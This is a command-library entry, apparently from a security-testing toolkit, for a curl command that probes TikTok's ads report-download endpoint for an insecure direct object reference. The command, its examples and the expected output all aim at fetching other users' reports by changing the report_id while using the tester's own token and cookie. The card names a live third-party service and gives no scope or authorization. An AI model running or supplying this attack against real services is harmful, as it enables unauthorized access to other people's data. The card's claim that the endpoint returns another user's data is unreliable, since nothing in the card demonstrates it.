---
id: cmd-curl-idor-test
data: >-
  curl -X GET "https://ads.tiktok.com/report/download?report_id=TARGET_ID" -H
  "Authorization: Bearer YOUR_TOKEN" -H "Cookie: session=YOUR_SESSION" -o
  output.json
tags:
  - web
  - testing
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:28.240Z'
verified: false
validated: true
submitted: true
---
# curl-idor-test

## Command

```bash
curl -X GET "https://ads.tiktok.com/report/download?report_id=TARGET_ID" -H "Authorization: Bearer YOUR_TOKEN" -H "Cookie: session=YOUR_SESSION" -o output.json
```

## Description

This curl command tests for IDOR vulnerabilities by sending an HTTP GET request to a report download endpoint with a manipulated report ID, using provided authentication headers to simulate an authenticated session.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method | Yes |
| `report_id=TARGET_ID` | The report ID parameter to manipulate for testing unauthorized access | Yes |
| `-H "Authorization: Bearer YOUR_TOKEN"` | Authentication token header | Yes |
| `-H "Cookie: session=YOUR_SESSION"` | Session cookie header | Yes |
| `-o output.json` | Output file for the response | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://ads.tiktok.com/report/download?report_id=12345" -H "Authorization: Bearer abc123" -H "Cookie: session=def456"
```

### Advanced Usage

```bash
curl -X GET "https://ads.tiktok.com/report/download?report_id=67890" -H "Authorization: Bearer abc123" -H "Cookie: session=def456" -v -o unauthorized_report.json
```

## Expected Output

Successful execution returns the report data in JSON or file format, such as {"report_data": "ad_metrics", "user_id": "target_user"}, without 403 or authentication errors. Failure shows error messages like "Access Denied".

## Related

- [[Related Procedure|procedures/Exploit-IDOR-in-Report-Download]]
